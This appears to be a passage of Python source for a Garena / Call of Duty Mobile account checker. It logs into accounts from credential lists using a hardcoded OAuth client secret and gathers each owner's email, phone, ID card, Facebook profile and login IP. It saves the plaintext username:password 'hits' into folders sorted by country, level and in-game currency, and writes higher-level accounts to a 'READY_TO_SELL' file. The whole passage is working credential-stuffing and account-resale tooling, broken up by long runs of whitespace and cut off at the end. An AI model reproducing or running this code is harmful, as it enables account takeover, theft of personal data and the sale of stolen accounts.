
def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {
        'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': '100082.connect.garena.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
                
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                            
                
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                        
            
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {
                        'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                        'codm_level': user_data.get('codm_level', 'N/A'),
                        'region': user_data.get('region', 'N/A'),
                        'uid': user_data.get('uid', 'N/A'),
                        'open_id': user_data.get('open_id', 'N/A'),
                        't_open_id': user_data.get('t_open_id', 'N/A')
                    }
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

# ============================================
# ACCOUNT DETAILS PARSING (From cod.py)
# ============================================

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound',
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive',
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

# ============================================
# DISPLAY FUNCTIONS (From cod.py - Preserved)
# ============================================

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    """Display CODM account information in a box"""
    if details is None:
        if error_reason is None:
            error_reason = 'Incorrect Password'
        _abox_open('✖  INVALID', bc=RED, tc=RED)
        _abox_row('Login', f'{account}:{password}', vc=GRAY, bc=RED)
        _abox_row('Reason', error_reason, vc=RED, bc=RED)
        _abox_close(bc=RED)
        return

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username = details.get('username', 'N/A')
    mobile = details['personal'].get('mobile_no', 'N/A')
    country_code = details['personal'].get('country_code', 'N/A')
    shell = details['profile'].get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    bind_status = 'Clean' if is_clean else 'Not Clean'
    game_info = details.get('game_info', [])
    formatted_mobile = format_mobile_number(mobile, country_code)
    if email and email != 'N/A' and ('@' in email):
        verification_status = '(Verified)' if email_verified else '(Not Verified)'
        email_display = f'{email} {verification_status}'
    else:
        email_display = 'N/A'
    fb_username = details['facebook']['fb_username']
    fb_uid = details['facebook']['fb_uid']
    if fb_uid != 'N/A' and fb_uid:
        fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}'
    else:
        fb_link = 'N/A'
    if fb_uid == 'N/A' or not fb_uid:
        fb_info = 'NOT CONNECTED'
        fb_username = 'N/A'
        fb_link = 'N/A'
    elif not fb_username or fb_username == 'N/A':
        fb_info = 'FB UNBIND or FB DELETED'
        fb_username = 'N/A'
    else:
        fb_info = 'CONNECTED'
    login_history = details.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
    ipk = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    ipc = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
    shell_c = YELLOW if int(shell or 0) > 0 else GRAY
    fb_c = GREEN if fb_info == 'CONNECTED' else YELLOW if 'UNBIND' in fb_info else GRAY
    other_games = [g for g in game_connections or [] if g.get('game', '').upper() != 'CODM']
    
    if has_codm and codm_info:
        bc = GREEN if is_clean else YELLOW
        title = '✨  CLEAN' if is_clean else '⊘  NOT CLEAN'
        lvl = codm_info.get('codm_level', 'N/A')
        _abox_open(title, bc=bc, tc=bc)
        _abox_row('Login', f'{account}:{password}', vc=GRAY, bc=bc)
        _abox_row('Username', username, vc=WHITE, bc=bc)
        _abox_row('Shell', str(shell), vc=shell_c, bc=bc)
        _abox_row('Email', email_display, vc=WHITE, bc=bc)
        _abox_row('Mobile', str(formatted_mobile), vc=WHITE, bc=bc)
        _abox_row('Facebook', fb_info, vc=fb_c, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('CODM Level', str(lvl), vc=CYAN, bc=bc)
        _abox_row('Server', str(codm_info.get('region', 'N/A')), vc=CYAN, bc=bc)
        _abox_row('IGN', str(codm_info.get('codm_nickname', 'N/A')), vc=CYAN, bc=bc)
        _abox_row('CODM UID', str(codm_info.get('uid', 'N/A')), vc=CYAN, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('Last Login', last_login_date, vc=GRAY, bc=bc)
        _abox_row('Login From', last_login_where, vc=GRAY, bc=bc)
        _abox_row('Login IP', ipk, vc=GRAY, bc=bc)
        _abox_row('Country', ipc, vc=GRAY, bc=bc)
        if other_games:
            _abox_sep(bc=bc)
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                _abox_row(f'{gname} [{greg}]' if greg else gname, grole, vc=MAGENTA, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('Status', bind_status, vc=bc, bc=bc)
        _abox_close(bc=bc)
    else:
        bc = MAGENTA if other_games else CYAN
        gnames = ' / '.join((g.get('game', '?') for g in other_games))
        title = f'◆  NO CODM  ({gnames})' if other_games else '○  NO CODM'
        _abox_open(title, bc=bc, tc=bc)
        _abox_row('Login', f'{account}:{password}', vc=GRAY, bc=bc)
        _abox_row('Username', username, vc=WHITE, bc=bc)
        _abox_row('Shell', str(shell), vc=shell_c, bc=bc)
        _abox_row('Email', email_display, vc=WHITE, bc=bc)
        _abox_row('Mobile', str(formatted_mobile), vc=WHITE, bc=bc)
        _abox_row('Facebook', fb_info, vc=fb_c, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('CODM', 'NO CODM ACCOUNT', vc=RED, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('Last Login', last_login_date, vc=GRAY, bc=bc)
        _abox_row('Login From', last_login_where, vc=GRAY, bc=bc)
        _abox_row('Login IP', ipk, vc=GRAY, bc=bc)
        _abox_row('Country', ipc, vc=GRAY, bc=bc)
        if other_games:
            _abox_sep(bc=bc)
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                _abox_row(f'{gname} [{greg}]' if greg else gname, grole, vc=MAGENTA, bc=bc)
        _abox_sep(bc=bc)
        _abox_row('Status', bind_status, vc=bc, bc=bc)
        _abox_close(bc=bc)

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)

# ============================================
# FORMAT HIT (From SHIN PALAUTOG)
# ============================================

def get_flag(code):
    """Get flag emoji from country code"""
    try:
        return "".join(chr(ord(c) + 127397) for c in str(code).upper())
    except:
        return ""

def format_hit(username, password, shell, level, region, nickname, uid, mobile, email, email_ver, two_step, auth_app, country, last_login, is_clean, fb_link="N/A", fb_info="NOT CONNECTED", last_login_ip="Unknown", has_codm=True, connected_games=None, colorized=False):
    """Format account hit information with nice styling"""
    if connected_games is None:
        connected_games = []
    
    active_status = "UNKNOWN"
    if last_login != 'Unknown':
        try:
            ll_str = last_login.replace(' UTC', '')
            ll_date = datetime.strptime(ll_str, '%Y-%m-%d %H:%M:%S')
            days_ago = (datetime.utcnow() - ll_date).days
            if days_ago <= 3:
                active_status = "ACTIVE"
            else:
                active_status = "INACTIVE"
        except:
            pass
        
    clean_text = "CLEAN" if is_clean else "NOT CLEAN"
    
    email_disp = f"{email} [verified]" if email_ver.lower() == "yes" else f"{email} [not verified]"
    fb_disp = "CONNECTED" if fb_info == "CONNECTED" else "NOT CONNECTED"
    
    c_flag = get_flag(country) if country and country != 'N/A' else ''
    r_flag = get_flag(region) if region and region != 'N/A' else ''
    
    cg_text = "\n".join([f"  ╰┈➤ {g}" for g in connected_games]) if connected_games else "  ╰┈➤ NONE"
        
    if has_codm:
        codm_block = f"🎮CALL OF DUTY ACCOUNT\n  ╰┈➤ NICKNAME: {nickname}\n  ╰┈➤ LEVEL: {level}\n  ╰┈➤ UID: {uid}\n  ╰┈➤ SERVER: {region} {r_flag}"
    else:
        codm_block = f"🎮CALL OF DUTY ACCOUNT\n  ╰┈➤ STATUS: NO ACCOUNT FOUND"

    block = f"""
ACCOUNT INFORMATION
USER'PASS: {username}:{password}
SHELLS: {shell}
STATUS: {active_status}
FB URL: {fb_link}
FB CONNECTED: {fb_disp}

{codm_block}

 BIND INFO
MOBILE NO: {mobile}
EMAIL: {email_disp}
2FA ENABLED: {two_step}
AUTHENTICATOR: {auth_app}
LAST LOGIN IP: {last_login_ip}
COUNTRY: {country} {c_flag}
ACCOUNT STATUS: {clean_text}

🔩CONNECTED GAMES
{cg_text}
POWERED BY @Tanongmoto
"""
    if colorized:
        c_clean = f"{GREEN}CLEAN{RESET}" if is_clean else f"{RED}NOT CLEAN{RESET}"
        c_status = f"{GREEN}{active_status}{RESET}" if "ACTIVE" in active_status else f"{RED}{active_status}{RESET}"
        try:
            c_shell = f"{GREEN}{shell}{RESET}" if int(str(shell)) > 0 else f"{RED}{shell}{RESET}"
        except:
            c_shell = f"{RED}{shell}{RESET}"
        
        c_fb_disp = f"{GREEN}CONNECTED{RESET}" if fb_info == "CONNECTED" else f"{RED}NOT CONNECTED{RESET}"
        
        if email_ver.lower() == "yes":
            c_email_disp = f"{WHITE}{email}{RESET} {GREEN}[verified]{RESET}"
        else:
            c_email_disp = f"{WHITE}{email}{RESET} {RED}[not verified]{RESET}"
        
        c_cg_text = "\n".join([f"  {GRAY}╰┈➤{RESET} {WHITE}{g}{RESET}" for g in connected_games]) if connected_games else f"  {GRAY}╰┈➤{RESET} {RED}NONE{RESET}"
        
        if has_codm:
            c_codm_block = f"{CYAN}🎮CALL OF DUTY ACCOUNT{RESET}\n  {GRAY}╰┈➤{RESET} NICKNAME: {WHITE}{nickname}{RESET}\n  {GRAY}╰┈➤{RESET} LEVEL: {WHITE}{level}{RESET}\n  {GRAY}╰┈➤{RESET} UID: {WHITE}{uid}{RESET}\n  {GRAY}╰┈➤{RESET} SERVER: {WHITE}{region} {r_flag}{RESET}"
        else:
            c_codm_block = f"{CYAN}🎮CALL OF DUTY ACCOUNT{RESET}\n  {GRAY}╰┈➤{RESET} STATUS: {RED}NO ACCOUNT FOUND{RESET}"

        colored_block = f"""
{CYAN}👥ACCOUNT INFORMATION{RESET}
  {GRAY}╰┈➤{RESET} USER'PASS: {WHITE}{username}:{password}{RESET}
  {GRAY}╰┈➤{RESET} SHELLS: {c_shell}
  {GRAY}╰┈➤{RESET} STATUS: {c_status}
  {GRAY}╰┈➤{RESET} FB URL: {WHITE}{fb_link}{RESET}
  {GRAY}╰┈➤{RESET} FB CONNECTED: {c_fb_disp}

{c_codm_block}

{CYAN}🔐BIND INFO{RESET}
  {GRAY}╰┈➤{RESET} MOBILE NO: {WHITE}{mobile}{RESET}
  {GRAY}╰┈➤{RESET} EMAIL: {c_email_disp}
  {GRAY}╰┈➤{RESET} 2FA ENABLED: {WHITE}{two_step}{RESET}
  {GRAY}╰┈➤{RESET} AUTHENTICATOR: {WHITE}{auth_app}{RESET}
  {GRAY}╰┈➤{RESET} LAST LOGIN IP: {WHITE}{last_login_ip}{RESET}
  {GRAY}╰┈➤{RESET} COUNTRY: {WHITE}{country} {c_flag}{RESET}
  {GRAY}╰┈➤{RESET} ACCOUNT STATUS: {c_clean}

{CYAN}🔩CONNECTED GAMES{RESET}
{c_cg_text}
  {YELLOW}╰┈➤ POWERED BY SHIN PALAUTOGSHIN PALAUTOGsuport{RESET}
"""
        return colored_block.strip("\n")

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
        
    return block.strip("\n")

# ============================================
# SAVE CLEAN OR NOT CLEAN (From SHIN PALAUTOG)
# ============================================

def save_clean_or_notclean(is_clean, shell, result_folder, formatted_text, codm_info=None, account=None, password=None, country=None, live_stats=None):
    """Save account result to appropriate files"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', formatted_text)
        
        with FILE_LOCK:
            if codm_info:
                file_path = os.path.join(result_folder, 'CLEAN.txt') if is_clean else os.path.join(result_folder, 'NOT_CLEAN.txt')
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
            else:
                file_path = os.path.join(result_folder, 'NO_CODM.txt')
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")

            try:
                shell_val = int(float(str(shell).strip()))
                if shell_val > 0:
                    shells_folder = os.path.join(result_folder, 'SHELLS')
                    os.makedirs(shells_folder, exist_ok=True)
                    
                    if shell_val <= 99:
                        shell_file = '1-99.txt'
                    elif shell_val <= 199:
                        shell_file = '100-199.txt'
                    elif shell_val <= 299:
                        shell_file = '200-299.txt'
                    elif shell_val <= 399:
                        shell_file = '300-399.txt'
                    elif shell_val <= 499:
                        shell_file = '400-499.txt'
                    else:
                        shell_file = '500+.txt'
                    
                    with open(os.path.join(shells_folder, shell_file), "a", encoding="utf-8") as sf:
                        sf.write(plain_text + "\n ________________________ \n\n")
            except:
                pass

            if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
                try:
                    codm_level = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    codm_level = 0
                
                region = codm_info.get('region', 'N/A').upper()
                country_code = country.upper() if country and country != 'N/A' else region
                if country_code == 'N/A' or not country_code or country_code == 'NONE':
                    country_code = region if region and region != 'N/A' else 'UNKNOWN'
                
                if codm_level <= 49:
                    level_range = "1-49"
                elif codm_level <= 99:
                    level_range = "50-99"
                elif codm_level <= 199:
                    level_range = "100-199"
                elif codm_level <= 299:
                    level_range = "200-299"
                else:
                    level_range = "300-400"
                
                folder_path = os.path.join(result_folder, "COUNTRY", country_code)
                os.makedirs(folder_path, exist_ok=True)
                with open(os.path.join(folder_path, f"{level_range}.txt"), "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
                
                if 90 <= codm_level <= 400 and account and password:
                    status_str = "clean" if is_clean else "notclean"
                    ign = codm_info.get('codm_nickname', 'N/A')
                    uid = codm_info.get('uid', 'N/A')
                    sell_line = f"{account}:{password} | shells: {shell} | level: {codm_level} | ign: {ign} | uid: {uid} | country: {country_code} | status: {status_str}\n"
                    
                    sell_path = os.path.join(result_folder, "READY_TO_SELL.txt")
                    with open(sell_path, "a", encoding="utf-8") as sf:
                        sf.write(sell_line)

            if live_stats and codm_info:
                try:
                    c_lvl = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    c_lvl = 0
                
                live_stats.add_hit(c_lvl, plain_text)
                
                with live_stats.lock:
                    sorted_desc = sorted(live_stats.valid_hits, key=lambda x: x['level'], reverse=True)
                
                with open(os.path.join(result_folder, 'HIGH_TO_LOW.txt'), 'w', encoding='utf-8') as f:
                    for hit in sorted_desc:
                        f.write(hit['text'] + "\n ________________________ \n\n")
    except:
        pass

# ============================================
# GAME CONNECTIONS (From cod.py)
# ============================================

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS', '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Pragma': 'no-cache', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://{base_domain}/?app={app_id}', 'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({'region': region.upper(), 'game': game_name, 'role': str(role)})
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
